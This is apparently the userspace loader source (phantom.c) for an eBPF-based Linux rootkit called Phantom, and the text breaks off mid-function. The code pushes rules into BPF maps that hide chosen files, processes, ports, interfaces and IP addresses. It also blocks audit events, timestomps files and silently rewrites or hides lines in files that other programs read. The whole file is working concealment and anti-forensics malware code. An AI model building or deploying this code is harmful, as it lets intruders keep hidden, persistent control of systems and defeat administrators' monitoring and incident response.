// SPDX-License-Identifier: MIT
/*
 * phantom.c - Userspace CLI for Phantom.
 *
 * Parses args, loads config and BPF programs, pushes rules to maps,
 * and runs as a daemon or prints status.
 */

#include <stdio.h>
#include <net/if.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <unistd.h>
#include <stdbool.h>
#include <time.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/utsname.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "phantom.skel.h"
#include "phantom.h"
#include "config.h"
#include "log.h"

/*
 * resolve_recvmsg_symbol - Pick recvmsg kretprobe attach symbol from kallsyms.
 *
 * bpf_override_return() needs ALLOW_ERROR_INJECTION; only arch syscall
 * wrappers (__x64_sys_recvmsg, __arm64_sys_recvmsg) qualify, not
 * sock_recvmsg or __sys_recvmsg.
 *
 * Returns: symbol name, or NULL if not found
 */
static const char *resolve_recvmsg_symbol(void)
{
    /* arch syscall wrappers first (ALLOW_ERROR_INJECTION) */
    static const char *candidates[] = {
        "__x64_sys_recvmsg",   /* x86_64 */
        "__arm64_sys_recvmsg", /* arm64 */
        NULL
    };

    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f)
        return NULL;

    char line[512];
    while (fgets(line, sizeof(line), f)) {
        for (int i = 0; candidates[i]; i++) {
            /* global text symbol: " T <name>\n" */
            char pattern[128];
            snprintf(pattern, sizeof(pattern), " T %s\n", candidates[i]);
            if (strstr(line, pattern)) {
                fclose(f);
                return candidates[i];
            }
        }
    }

    fclose(f);
    return NULL;
}


/*
 * Global daemon state.
 *
 * skel:          loaded BPF skeleton (programs + maps)
 * running:       0 after SIGINT/SIGTERM stops the event loop
 * links:         attached bpf_link handles for destroy_links()
 * reload_config: set by SIGHUP to reload /opt/pinfra.json
 * pidfile_path:  PID file for add/del SIGHUP notify
 */
static struct phantom_bpf *skel = NULL;
static volatile sig_atomic_t running = 1;
static struct bpf_link *links[64];
static int link_count = 0;
static volatile sig_atomic_t reload_config = 0;
static const char *pidfile_path = "/tmp/phantom.pid";

/*
 * destroy_links - Detach and destroy all bpf_link handles.
 */
static void destroy_links(void)
{
    for (int i = 0; i < link_count; i++) {
        bpf_link__destroy(links[i]);
        links[i] = NULL;
    }
    link_count = 0;
}

// ============================================================
// PID file management
// ============================================================

/*
 * create_pidfile - Write daemon PID to pidfile_path for SIGHUP notify.
 *
 * Returns: 0 on success, -1 on I/O failure
 */
static int create_pidfile(void)
{
    FILE *f = fopen(pidfile_path, "w");
    if (!f) {
        LOG_WARN("Failed to create PID file %s: %s", pidfile_path, strerror(errno));
        return -1;
    }
    fprintf(f, "%d\n", getpid());
    fclose(f);
    return 0;
}

/*
 * read_pidfile - Read the daemon PID from pidfile_path.
 *
 * Returns: PID on success, -1 if missing or unreadable
 */
static pid_t read_pidfile(void)
{
    FILE *f = fopen(pidfile_path, "r");
    if (!f)
        return -1;
    pid_t pid;
    if (fscanf(f, "%d", &pid) != 1) {
        fclose(f);
        return -1;
    }
    fclose(f);
    return pid;
}

/*
 * remove_pidfile - Unlink pidfile on shutdown if it still names this PID.
 *
 * add/del/flush/status share cleanup; skip if another daemon owns the file.
 */
static void remove_pidfile(void)
{
    pid_t written = read_pidfile();
    if (written > 0 && written != getpid())
        return;
    unlink(pidfile_path);
}

// ============================================================
// Signal handler
// ============================================================
/*
 * sig_handler - Handle SIGINT, SIGTERM, and SIGHUP.
 *
 * SIGINT/SIGTERM clear running; SIGHUP sets reload_config for JSON reload.
 */
static void sig_handler(int sig)
{
    if (sig == SIGHUP)
        reload_config = 1;
    else
        running = 0;
}

// ============================================================
// Event handler (ring buffer callback)
// ============================================================
/*
 * handle_event - Ring buffer callback for BPF events.
 *
 * Prints one line per event when debug is enabled in ctx.
 *
 * Returns: 0 (required by ring_buffer API)
 */
static int handle_event(void *ctx, void *data, size_t data_sz)
{
    /* skip when debug flag in ctx is off */
    if (!ctx || !*(const bool *)ctx)
        return 0;

    const struct event *e = data;
    const char *type_str;

    switch (e->type) {
    case EVENT_FILE_HIDDEN:
        type_str = "FILE_HIDDEN";
        break;
    case EVENT_PROCESS_HIDDEN:
        type_str = "PROC_HIDDEN";
        break;
    case EVENT_PORT_HIDDEN:
        type_str = "PORT_HIDDEN";
        break;
    case EVENT_AUDIT_BLOCKED:
        type_str = "AUDIT_BLOCKED";
        break;
    case EVENT_TIMESTOMP:
        type_str = "TIMESTOMP";
        break;
    case EVENT_EXEC_CAPTURED:
        type_str = "EXEC_CAPTURED";
        break;
    case EVENT_ERROR:
        type_str = "ERROR";
        break;
    case EVENT_FILE_LINE_HIDDEN:
        type_str = "FILE_LINE_HIDDEN";
        break;
    case EVENT_FILE_REPLACED:
        type_str = "FILE_REPLACED";
        break;
    case EVENT_IFACE_HIDDEN:
        type_str = "IFACE_HIDDEN";
        break;
    case EVENT_IP_HIDDEN:
        type_str = "IP_HIDDEN";
        break;
    default:
        type_str = "UNKNOWN";
        break;
    }

    printf("[%s] pid=%d comm=%s",
           type_str, e->pid, e->comm);

    if (e->filename[0])
        printf(" file=%s", e->filename);

    if (e->port)
        printf(" port=%u", e->port);

    printf(" success=%s\n", e->success ? "yes" : "no");

    return 0;
}

// ============================================================
// Map update helpers
// ============================================================
/*
 * bpf_errstr - Map negative libbpf errno to a short string.
 *
 * Returns: static buffer (overwritten on each call)
 */
static const char *bpf_errstr(int err)
{
    static char buf[128];

    if (err >= 0)
        return "unknown error";
    if (libbpf_strerror(-err, buf, sizeof(buf)) == 0)
        return buf;
    snprintf(buf, sizeof(buf), "error %d", err);
    return buf;
}

/*
 * bitmap_set_bit - Set one bit in an ARRAY-backed BPF bitmap map.
 *
 * key = id >> 3, bit = id & 7; read-modify-write one byte.
 *
 * Returns: 0 on success, -EINVAL if id > max_id
 */
static int bitmap_set_bit(struct bpf_map *map, __u32 id, __u32 max_id)
{
    if (id > max_id)
        return -EINVAL;

    __u32 key = id >> 3;        /* byte index */
    __u8 byte = 0;
    int fd = bpf_map__fd(map);

    /* default missing map byte to 0 */
    if (bpf_map_lookup_elem(fd, &key, &byte) != 0)
        byte = 0;
    byte |= (__u8)(1u << (id & 7));  /* bit within byte */
    return bpf_map__update_elem(map, &key, sizeof(key), &byte, sizeof(byte), BPF_ANY);
}

/*
 * hide_port_bitmap - Set hidden_port_bits for one TCP/UDP port (0-65535).
 */
static int hide_port_bitmap(__u32 port)
{
    if (port > 65535)
        return -EINVAL;
    return bitmap_set_bit(skel->maps.hidden_port_bits, port, 65535);
}

/*
 * apply_ports_to_bitmap - Hide each port in hidden_port_bits (best-effort).
 *
 * Per-port RMW; avoids a multi-KiB stack bitmap in the caller config.
 *
 * Returns: 0, or last error from hide_port_bitmap
 */
static int apply_ports_to_bitmap(const __u32 *ports, int port_count)
{
    int err = 0;

    for (int i = 0; i < port_count; i++) {
        int rc = hide_port_bitmap(ports[i]);
        if (rc) {
            LOG_ERROR("Failed to hide port %u: %s", ports[i], bpf_errstr(rc));
            err = rc;
        }
    }
    return err;
}

/*
 * hide_pid_bitmap - Set hidden_pid_bits for one PID (max HIDDEN_PID_MAX).
 */
static int hide_pid_bitmap(__u32 pid)
{
    if (pid > HIDDEN_PID_MAX) {
        LOG_ERROR("PID %u exceeds max hideable PID %u", pid, HIDDEN_PID_MAX);
        return -EINVAL;
    }
    return bitmap_set_bit(skel->maps.hidden_pid_bits, pid, HIDDEN_PID_MAX);
}

/*
 * dump_bitmap_ports - Print set bits in hidden_port_bits for status.
 */
static void dump_bitmap_ports(void)
{
    int fd = bpf_map__fd(skel->maps.hidden_port_bits);
    int n = 0;

    for (__u32 key = 0; key < HIDDEN_PORT_BITMAP_BYTES; key++) {
        __u8 byte = 0;
        if (bpf_map_lookup_elem(fd, &key, &byte) != 0 || byte == 0)
            continue;
        for (int bit = 0; bit < 8; bit++) {
            if (!(byte & (1u << bit)))
                continue;
            __u32 port = (key << 3) | (__u32)bit;
            LOG_INFO("  %u", port);
            n++;
        }
    }
    if (n == 0)
        LOG_INFO("  (none)");
}

/*
 * dump_bitmap_pids - Print set bits in hidden_pid_bits for status.
 */
static void dump_bitmap_pids(void)
{
    int fd = bpf_map__fd(skel->maps.hidden_pid_bits);
    int n = 0;

    for (__u32 key = 0; key < HIDDEN_PID_BITMAP_BYTES; key++) {
        __u8 byte = 0;
        if (bpf_map_lookup_elem(fd, &key, &byte) != 0 || byte == 0)
            continue;
        for (int bit = 0; bit < 8; bit++) {
            if (!(byte & (1u << bit)))
                continue;
            __u32 pid = (key << 3) | (__u32)bit;
            LOG_INFO("  PID %u", pid);
            n++;
        }
    }
    if (n == 0)
        LOG_INFO("  (none)");
}

/*
 * apply_hide_config - Push file/prefix/PID/port rules into BPF maps.
 *
 * hidden_files: HASH (basename key). hidden_prefixes: LPM trie.
 * hidden_pid_bits + hidden_proc_names for PIDs. hidden_port_bits for ports.
 * target_ppid: ARRAY slot 0 when target_ppid is set.
 *
 * Returns: 0, or last bpf_map__update_elem error
 */
static int apply_hide_config(char **files, int file_count,
                             char **prefixes, int prefix_count,
                             __u32 *pids, int pid_count,
                             __u32 *ports, int port_count,
                             __u32 target_ppid)
{
    __u8 val = 1;
    int err = 0;

    /* clamp to map capacity */
    if (file_count > MAX_HIDDEN_FILES)
        file_count = MAX_HIDDEN_FILES;
    if (prefix_count > MAX_HIDDEN_PREFIXES)
        prefix_count = MAX_HIDDEN_PREFIXES;
    if (pid_count > MAX_HIDDEN_PIDS)
        pid_count = MAX_HIDDEN_PIDS;
    if (port_count > MAX_HIDDEN_PORTS)
        port_count = MAX_HIDDEN_PORTS;

    /* hidden_files: basename only */
    for (int i = 0; i < file_count; i++) {
        char key[MAX_FILENAME_LEN] = {};
        const char *base = strrchr(files[i], '/');
        const char *name = (base && *(base + 1)) ? (base + 1) : files[i];
        strncpy(key, name, MAX_FILENAME_LEN - 1);
        int rc = bpf_map__update_elem(skel->maps.hidden_files,
                                      key, sizeof(key),
                                      &val, sizeof(val),
                                      BPF_ANY);
        if (rc) {
            LOG_ERROR("Failed to hide file %s: %s", name, bpf_errstr(rc));
            err = rc;
        }
    }

    /* hidden_prefixes: LPM trie, prefixlen in bits */
    for (int i = 0; i < prefix_count; i++) {
        struct {
            __u32 prefixlen;
            char data[MAX_PREFIX_LEN];
        } key = {};
        size_t len = strlen(prefixes[i]);
        if (len > MAX_PREFIX_LEN)
            len = MAX_PREFIX_LEN;
        key.prefixlen = (__u32)(len * 8);  /* bits */
        memcpy(key.data, prefixes[i], len);
        int rc = bpf_map__update_elem(skel->maps.hidden_prefixes,
                                      &key, sizeof(key),
                                      &val, sizeof(val),
                                      BPF_ANY);
        if (rc) {
            LOG_ERROR("Failed to hide prefix %s: %s", prefixes[i], bpf_errstr(rc));
            err = rc;
        }
    }

    /* PIDs: bitmap + hidden_proc_names (decimal string key) */
    for (int i = 0; i < pid_count; i++) {
        int rc = hide_pid_bitmap(pids[i]);
        if (rc) {
            LOG_ERROR("Failed to hide PID %u: %s", pids[i], bpf_errstr(rc));
            err = rc;
        }

        /* hidden_proc_names for /proc/<pid> getdents path */
        char proc_key[16] = {};
        snprintf(proc_key, sizeof(proc_key), "%u", pids[i]);
        __u8 val = 1;
        rc = bpf_map__update_elem(skel->maps.hidden_proc_names,
                                  proc_key, sizeof(proc_key),
                                  &val, sizeof(val),
                                  BPF_ANY);
        if (rc) {
            LOG_ERROR("Failed to add proc name %s: %s", proc_key, bpf_errstr(rc));
            err = rc;
        }
    }

    /* hidden_port_bits bitmap */
    if (port_count > 0) {
        int rc = apply_ports_to_bitmap(ports, port_count);
        if (rc) {
            LOG_ERROR("Failed to apply port hide bitmap: %s", bpf_errstr(rc));
            err = rc;
        }
    }

    /* target_ppid ARRAY: hide only from children of this PPID */
    if (target_ppid) {
        __u32 key = 0;
        int rc = bpf_map__update_elem(skel->maps.target_ppid,
                                      &key, sizeof(key),
                                      &target_ppid, sizeof(target_ppid),
                                      BPF_ANY);
        if (rc) {
            LOG_ERROR("Failed to set target PPID %u: %s", target_ppid, bpf_errstr(rc));
            err = rc;
        }
    }

    return err;
}

/*
 * apply_file_filter_config - Push file_filter_rules (HASH, path key).
 *
 * Returns: 0, or last map update error
 */
static int apply_file_filter_config(struct phantom_cli_config *cfg)
{
    int err = 0;

    for (int i = 0; i < cfg->file_filter_count; i++) {
        struct file_filter_entry *entry = &cfg->file_filters[i];

        struct file_filter_rule rule = {};
        rule.mode = entry->mode;

        size_t search_len = strlen(entry->search);
        if (search_len >= MAX_FILE_FILTER_SEARCH) {
            LOG_ERROR("Search string too long: %s", entry->search);
            err = -EINVAL;
            continue;
        }
        __builtin_memcpy(rule.search, entry->search, search_len);
        rule.search_len = search_len;

        size_t replace_len = strlen(entry->replace);
        if (replace_len >= MAX_FILE_FILTER_REPLACE) {
            LOG_ERROR("Replace string too long: %s", entry->replace);
            err = -EINVAL;
            continue;
        }
        __builtin_memcpy(rule.replace, entry->replace, replace_len);
        rule.replace_len = replace_len;

        char key[MAX_FILE_FILTER_PATH] = {};
        size_t path_len = strlen(entry->path);
        if (path_len >= MAX_FILE_FILTER_PATH) {
            LOG_ERROR("Path too long: %s", entry->path);
            err = -EINVAL;
            continue;
        }
        __builtin_memcpy(key, entry->path, path_len);

        int rc = bpf_map__update_elem(skel->maps.file_filter_rules,
                                      key, sizeof(key),
                                      &rule, sizeof(rule),
                                      BPF_ANY);
        if (rc) {
            LOG_ERROR("Failed to add file filter rule for %s: %s",
                      entry->path, bpf_errstr(rc));
            err = rc;
        }
    }

    return err;
}

/*
 * resolve_exe_path_to_pids - Match /proc/<pid>/exe to want_path.
 *
 * Returns: count of PIDs added, or -1 if /proc open fails
 */
static int resolve_exe_path_to_pids(const char *want_path, __u32 *pids, int *pid_count,
                                    int max_pids)
{
    DIR *proc = opendir("/proc");
    if (!proc) {
        LOG_ERROR("Cannot open /proc: %s", strerror(errno));
        return -1;
    }

    int found = 0;
    struct dirent *de;
    while ((de = readdir(proc)) != NULL) {
        if (de->d_name[0] < '1' || de->d_name[0] > '9')
            continue;

        __u32 pid = (__u32)strtoul(de->d_name, NULL, 10);
        if (pid == 0)
            continue;

        char linkpath[64];
        char exe[MAX_PATH_LEN];
        snprintf(linkpath, sizeof(linkpath), "/proc/%u/exe", pid);
        ssize_t n = readlink(linkpath, exe, sizeof(exe) - 1);
        if (n < 0)
            continue;
        exe[n] = '\0';

        /* drop " (deleted)" from readlink target */
        char *deleted = strstr(exe, " (deleted)");
        if (deleted)
            *deleted = '\0';

        if (strcmp(exe, want_path) != 0)
            continue;

        int already = 0;
        for (int i = 0; i < *pid_count; i++) {
            if (pids[i] == pid) {
                already = 1;
                break;
            }
        }
        if (already)
            continue;

        if (*pid_count >= max_pids) {
            LOG_WARN("Max exempt PIDs (%d) reached while resolving %s", max_pids, want_path);
            closedir(proc);
            return found;
        }

        pids[(*pid_count)++] = pid;
        found++;
        LOG_INFO("Resolved exempt path %s -> PID %u", want_path, pid);
    }

    closedir(proc);
    if (!found)
        LOG_WARN("No running process matched exe path: %s", want_path);
    return found;
}

/*
 * lpm_put_proc_path - Insert exe path into hidden_proc_path_prefixes LPM trie.
 *
 * prefixlen = strlen(path) * 8 bits.
 */
static int lpm_put_proc_path(const char *path)
{
    struct {
        __u32 prefixlen;
        char data[MAX_PROC_PATH_PREFIX_LEN];
    } key = {};
    __u8 val = 1;
    size_t len = strlen(path);

    if (len == 0)
        return 0;
    if (len > MAX_PROC_PATH_PREFIX_LEN) {
        LOG_WARN("Process path prefix truncated to %d bytes: %s",
                 MAX_PROC_PATH_PREFIX_LEN, path);
        len = MAX_PROC_PATH_PREFIX_LEN;
    }
    key.prefixlen = (__u32)(len * 8);
    memcpy(key.data, path, len);

    int rc = bpf_map__update_elem(skel->maps.hidden_proc_path_prefixes,
                                  &key, sizeof(key),
                                  &val, sizeof(val),
                                  BPF_ANY);
    if (rc)
        LOG_ERROR("Failed to add proc path prefix %s: %s", path, bpf_errstr(rc));
    else
        LOG_INFO("Proc path LPM: %s (%zu bytes)", path, len);
    return rc;
}

/*
 * apply_proc_path_lpm - Load process_names and process_path_prefixes into LPM trie.
 */
static int apply_proc_path_lpm(struct phantom_cli_config *cfg)
{
    int err = 0;

    for (int i = 0; i < cfg->process_name_count; i++) {
        const char *name = cfg->process_names[i];
        if (!name || name[0] != '/')
            continue;
        int rc = lpm_put_proc_path(name);
        if (rc)
            err = rc;
    }
    for (int i = 0; i < cfg->process_path_prefix_count; i++) {
        const char *prefix = cfg->process_path_prefixes[i];
        if (!prefix || !prefix[0])
            continue;
        int rc = lpm_put_proc_path(prefix);
        if (rc)
            err = rc;
    }
    return err;
}

/*
 * apply_file_filter_exempts - Push comm names and resolved PIDs to exempt maps.
 *
 * file_filter_exempt_comms: HASH (comm key). file_filter_exempt_pids: HASH.
 */
static int apply_file_filter_exempts(struct phantom_cli_config *cfg)
{
    int err = 0;
    __u8 val = 1;
    __u32 pids[256];
    int pid_count = 0;

    for (int i = 0; i < cfg->file_filter_exempt_count; i++) {
        const char *entry = cfg->file_filter_exempts[i];
        if (!entry || !entry[0])
            continue;

        if (entry[0] == '/') {
            int before = pid_count;
            if (resolve_exe_path_to_pids(entry, pids, &pid_count, 256) < 0)
                err = -errno;
            if (pid_count == before)
                LOG_WARN("Exempt path %s: no matching PIDs yet", entry);
            continue;
        }

        char key[TASK_COMM_LEN] = {};
        strncpy(key, entry, sizeof(key) - 1);
        int rc = bpf_map__update_elem(skel->maps.file_filter_exempt_comms,
                                      key, sizeof(key),
                                      &val, sizeof(val),
                                      BPF_ANY);
        if (rc) {
            LOG_ERROR("Failed to add file-filter exempt %s: %s", entry, bpf_errstr(rc));
            err = rc;
        } else {
            LOG_INFO("File-filter exempt (comm): %s", key);
        }
    }

    for (int i = 0; i < pid_count; i++) {
        int rc = bpf_map__update_elem(skel->maps.file_filter_exempt_pids,
                                      &pids[i], sizeof(pids[i]),
                                      &val, sizeof(val),
                                      BPF_ANY);
        if (rc) {
            LOG_ERROR("Failed to add file-filter exempt PID %u: %s",
                      pids[i], bpf_errstr(rc));
            err = rc;
        } else {
            LOG_INFO("File-filter exempt (pid): %u", pids[i]);
        }
    }

    return err;
}

/*
 * apply_iface_ip_config - Push iface names, ifindexes, and IP prefixes to maps.
 *
 * hidden_iface_names + hidden_ifindexes (HASH). hidden_ip_addrs LPM trie (/32 default).
 *
 * Returns: 0, or last error
 */
static int apply_iface_ip_config(struct phantom_cli_config *cfg)
{
    __u8 val = 1;
    int err = 0;

    /* hidden_iface_names + hidden_ifindexes for getifaddrs-safe hiding */
    for (int i = 0; i < cfg->iface_count; i++) {
        char key[16] = {};
        strncpy(key, cfg->iface_names[i], sizeof(key) - 1);
        int rc = bpf_map__update_elem(skel->maps.hidden_iface_names,
                                      key, sizeof(key),
                                      &val, sizeof(val),
                                      BPF_ANY);
        if (rc) {
            LOG_ERROR("Failed to hide iface %s: %s", cfg->iface_names[i], bpf_errstr(rc));
            err = rc;
        }
        unsigned int ifindex = if_nametoindex(cfg->iface_names[i]);
        if (ifindex) {
            __u32 ikey = ifindex;
            rc = bpf_map__update_elem(skel->maps.hidden_ifindexes,
                                     &ikey, sizeof(ikey),
                                     &val, sizeof(val),
                                     BPF_ANY);
            if (rc) {
                LOG_ERROR("Failed to hide ifindex %u (%s): %s",
                          ifindex, cfg->iface_names[i], bpf_errstr(rc));
                err = rc;
            }
        }
    }

    /* hidden_ip_addrs LPM trie */
    for (int i = 0; i < cfg->ip_count; i++) {
        struct {
            __u32 prefixlen;
            __u8 data[4];
        } key = {};

        const char *addr_str = cfg->ip_addrs[i];
        const char *slash = strchr(addr_str, '/');
        int prefix_len = 32; /* /32 when no CIDR suffix */

        char ip_buf[32] = {};
        if (slash) {
            size_t ip_len = slash - addr_str;
            if (ip_len >= sizeof(ip_buf))
                ip_len = sizeof(ip_buf) - 1;
            strncpy(ip_buf, addr_str, ip_len);
            prefix_len = atoi(slash + 1);
        } else {
            strncpy(ip_buf, addr_str, sizeof(ip_buf) - 1);
        }

        
        unsigned int a, b, c, d;
        if (sscanf(ip_buf, "%u.%u.%u.%u", &a, &b, &c, &d) == 4 &&
            a <= 255 && b <= 255 && c <= 255 && d <= 255 &&
            prefix_len >= 0 && prefix_len <= 32) {
            key.prefixlen = (__u32)prefix_len;
            key.data[0] = (__u8)a;
            key.data[1] = (__u8)b;
            key.data[2] = (__u8)c;
            key.data[3] = (__u8)d;

            int rc = bpf_map__update_elem(skel->maps.hidden_ip_addrs,
                                          &key, sizeof(key),
                                          &val, sizeof(val),
                                          BPF_ANY);
            if (rc) {
                LOG_ERROR("Failed to hide IP %s: %s", cfg->ip_addrs[i], bpf_errstr(rc));
                err = rc;
            }
        } else {
            LOG_ERROR("Invalid IP address: %s", cfg->ip_addrs[i]);
            err = -EINVAL;
        }
    }

    return err;
}

/*
 * save_config_to_file - Write cfg as JSON to /opt/pinfra.json (atomic rename).
 *
 * Returns: 0 on success, -1 on validation or I/O failure
 */
static int save_config_to_file(struct phantom_cli_config *cfg)
{
    if (phantom_config_validate_file_filters(cfg))
        return -1;

    const char *path = "/opt/pinfra.json";
    char tmp_path[sizeof("/opt/pinfra.json") + 16];
    snprintf(tmp_path, sizeof(tmp_path), "%s.tmp.%d", path, (int)getpid());

    FILE *f = fopen(tmp_path, "w");
    if (!f) {
        LOG_ERROR("Failed to open %s for writing: %s", tmp_path, strerror(errno));
        return -1;
    }

    fprintf(f, "{\n");

    if (cfg->file_count > 0) {
        fprintf(f, "  \"files\": [");
        for (int i = 0; i < cfg->file_count; i++) {
            if (i > 0) fprintf(f, ", ");
            fprintf(f, "\"%s\"", cfg->files[i]);
        }
        fprintf(f, "],\n");
    }

    if (cfg->prefix_count > 0) {
        fprintf(f, "  \"prefixes\": [");
        for (int i = 0; i < cfg->prefix_count; i++) {
            if (i > 0) fprintf(f, ", ");
            fprintf(f, "\"%s\"", cfg->prefixes[i]);
        }
        fprintf(f, "],\n");
    }

    if (cfg->pid_count > 0) {
        fprintf(f, "  \"pids\": [");
        for (int i = 0; i < cfg->pid_count; i++) {
            if (i > 0) fprintf(f, ", ");
            fprintf(f, "%u", cfg->pids[i]);
        }
        fprintf(f, "],\n");
    }

    if (cfg->port_count > 0) {
        fprintf(f, "  \"ports\": [");
        for (int i = 0; i < cfg->port_count; i++) {
            if (i > 0) fprintf(f, ", ");
            fprintf(f, "%u", cfg->ports[i]);
        }
        fprintf(f, "],\n");
    }

    if (cfg->process_name_count > 0) {
        fprintf(f, "  \"process_names\": [");
        for (int i = 0; i < cfg->process_name_count; i++) {
            if (i > 0) fprintf(f, ", ");
            fprintf(f, "\"%s\"", cfg->process_names[i]);
        }
        fprintf(f, "],\n");
    }

    if (cfg->process_path_prefix_count > 0) {
        fprintf(f, "  \"process_path_prefixes\": [");
        for (int i = 0; i < cfg->process_path_prefix_count; i++) {
            if (i > 0) fprintf(f, ", ");
            fprintf(f, "\"%s\"", cfg->process_path_prefixes[i]);
        }
        fprintf(f, "],\n");
    }

    if (cfg->exec_name_count > 0) {
        fprintf(f, "  \"exec_names\": [");
        for (int i = 0; i < cfg->exec_name_count; i++) {
            if (i > 0) fprintf(f, ", ");
            fprintf(f, "\"%s\"", cfg->exec_names[i]);
        }
        fprintf(f, "],\n");
    }

    if (cfg->iface_count > 0) {
        fprintf(f, "  \"ifaces\": [");
        for (int i = 0; i < cfg->iface_count; i++) {
            if (i > 0) fprintf(f, ", ");
            fprintf(f, "\"%s\"", cfg->iface_names[i]);
        }
        fprintf(f, "],\n");
    }

    if (cfg->ip_count > 0) {
        fprintf(f, "  \"ips\": [");
        for (int i = 0; i < cfg->ip_count; i++) {
            if (i > 0) fprintf(f, ", ");
            fprintf(f, "\"%s\"", cfg->ip_addrs[i]);
        }
        fprintf(f, "],\n");
    }

    if (cfg->set_ppid && cfg->target_ppid > 0) {
        fprintf(f, "  \"ppid\": %u,\n", cfg->target_ppid);
    }

    if (cfg->file_filter_count > 0) {
        fprintf(f, "  \"file_filters\": [\n");
        for (int i = 0; i < cfg->file_filter_count; i++) {
            struct file_filter_entry *e = &cfg->file_filters[i];
            fprintf(f, "    {\n");
            fprintf(f, "      \"path\": \"%s\",\n", e->path);
            fprintf(f, "      \"search\": \"%s\",\n", e->search);
            if (e->mode == FILE_FILTER_MODE_REPLACE) {
                fprintf(f, "      \"replace\": \"%s\",\n", e->replace);
                fprintf(f, "      \"mode\": \"replace\"\n");
            } else {
                fprintf(f, "      \"mode\": \"hide\"\n");
            }
            fprintf(f, "    }%s\n", i < cfg->file_filter_count - 1 ? "," : "");
        }
        fprintf(f, "  ],\n");
    }

    if (cfg->file_filter_exempt_count > 0) {
        fprintf(f, "  \"file_filter_exempts\": [");
        for (int i = 0; i < cfg->file_filter_exempt_count; i++) {
            if (i > 0) fprintf(f, ", ");
            fprintf(f, "\"%s\"", cfg->file_filter_exempts[i]);
        }
        fprintf(f, "],\n");
    }

    if (cfg->enable_timestomp) {
        if (cfg->global_timestomp_timestamp) {
            fprintf(f, "  \"timestomp_global\": \"%s\",\n", cfg->global_timestomp_timestamp);
        }

        if (cfg->timestomp_rule_count > 0) {
            fprintf(f, "  \"timestomp_rules\": [\n");
            for (int i = 0; i < cfg->timestomp_rule_count; i++) {
                struct timestomp_rule *rule = &cfg->timestomp_rules[i];
                fprintf(f, "    {\"path\": \"%s\", \"timestamp\": \"%s\"}%s\n",
                        rule->path, rule->timestamp,
                        i < cfg->timestomp_rule_count - 1 ? "," : "");
            }
            fprintf(f, "  ],\n");
        }
    }

    fprintf(f, "  \"enable_files\": %s,\n", cfg->enable_files ? "true" : "false");
    fprintf(f, "  \"enable_procs\": %s,\n", cfg->enable_procs ? "true" : "false");
    fprintf(f, "  \"enable_ports\": %s,\n", cfg->enable_ports ? "true" : "false");
    fprintf(f, "  \"enable_audit\": %s,\n", cfg->enable_audit ? "true" : "false");
    fprintf(f, "  \"enable_exec\": %s,\n", cfg->enable_exec ? "true" : "false");
    fprintf(f, "  \"enable_file_filter\": %s,\n", cfg->enable_file_filter ? "true" : "false");
    fprintf(f, "  \"enable_iface\": %s,\n", cfg->enable_iface ? "true" : "false");
    fprintf(f, "  \"enable_ip\": %s,\n", cfg->enable_ip ? "true" : "false");
    fprintf(f, "  \"enable_timestomp\": %s\n", cfg->enable_timestomp ? "true" : "false");

    fprintf(f, "}\n");
    if (fflush(f) != 0) {
        LOG_ERROR("Failed to flush %s: %s", tmp_path, strerror(errno));
        fclose(f);
        unlink(tmp_path);
        return -1;
    }
    if (fsync(fileno(f)) != 0) {
        LOG_ERROR("Failed to fsync %s: %s", tmp_path, strerror(errno));
        fclose(f);
        unlink(tmp_path);
        return -1;
    }
    fclose(f);

    if (rename(tmp_path, path) != 0) {
        LOG_ERROR("Failed to replace %s: %s", path, strerror(errno));
        unlink(tmp_path);
        return -1;
    }

    LOG_INFO("Config saved to %s", path);
    return 0;
}

/*
 * set_config - Write one feature toggle in feature_config ARRAY.
 */
static void set_config(__u32 key, __u32 value)
{
    bpf_map__update_elem(skel->maps.feature_config,
                         &key, sizeof(key),
                         &value, sizeof(value),
                         BPF_ANY);
}

/*
 * dump_hide_config - Print active rules from BPF maps (status command).
 */
static void dump_hide_config(void)
{
    int n;

    /* hidden_files HASH */
    LOG_INFO("Hidden files:");
    n = 0;
    {
        int fd = bpf_map__fd(skel->maps.hidden_files);
        char key[MAX_FILENAME_LEN], next_key[MAX_FILENAME_LEN];
        char *key_ptr = NULL;
        __u8 val;

        while (bpf_map_get_next_key(fd, key_ptr, next_key) == 0) {
            memcpy(key, next_key, sizeof(key));
            key_ptr = key;
            if (bpf_map_lookup_elem(fd, key, &val) == 0) {
                LOG_INFO("  %s", key);
                n++;
            }
        }
    }
    if (n == 0)
        LOG_INFO("  (none)");

    /* hidden_prefixes LPM trie */
    LOG_INFO("Hidden prefixes:");
    n = 0;
    {
        int fd = bpf_map__fd(skel->maps.hidden_prefixes);
        struct {
            __u32 prefixlen;
            char data[MAX_PREFIX_LEN];
        } key = {}, next_key;
        void *key_ptr = NULL;
        __u8 val;

        while (bpf_map_get_next_key(fd, key_ptr, &next_key) == 0) {
            key = next_key;
            key_ptr = &key;
            if (bpf_map_lookup_elem(fd, &key, &val) == 0) {
                /* prefixlen is bits; display uses bytes */
                __u32 len = key.prefixlen / 8;
                if (len >= MAX_PREFIX_LEN)
                    len = MAX_PREFIX_LEN - 1;
                key.data[len] = '\0';
                LOG_INFO("  %s", key.data);
                n++;
            }
        }
    }
    if (n == 0)
        LOG_INFO("  (none)");

    /* hidden_pid_bits */
    LOG_INFO("Hidden PIDs:");
    dump_bitmap_pids();

    /* hidden_port_bits */
    LOG_INFO("Hidden ports:");
    dump_bitmap_ports();

    /* hidden_iface_names HASH */
    LOG_INFO("Hidden interfaces:");
    n = 0;
    {
        int fd = bpf_map__fd(skel->maps.hidden_iface_names);
        char key[16], next_key[16];
        char *key_ptr = NULL;
        __u8 val;

        while (bpf_map_get_next_key(fd, key_ptr, next_key) == 0) {
            memcpy(key, next_key, sizeof(key));
            key_ptr = key;
            if (bpf_map_lookup_elem(fd, key, &val) == 0) {
                LOG_INFO("  %s", key);
                n++;
            }
        }
    }
    if (n == 0)
        LOG_INFO("  (none)");

    /* hidden_ip_addrs LPM trie */
    LOG_INFO("Hidden IPs:");
    n = 0;
    {
        int fd = bpf_map__fd(skel->maps.hidden_ip_addrs);
        struct {
            __u32 prefixlen;
            __u8 data[4];
        } key = {}, next_key;
        void *key_ptr = NULL;
        __u8 val;

        while (bpf_map_get_next_key(fd, key_ptr, &next_key) == 0) {
            key = next_key;
            key_ptr = &key;
            if (bpf_map_lookup_elem(fd, &key, &val) == 0) {
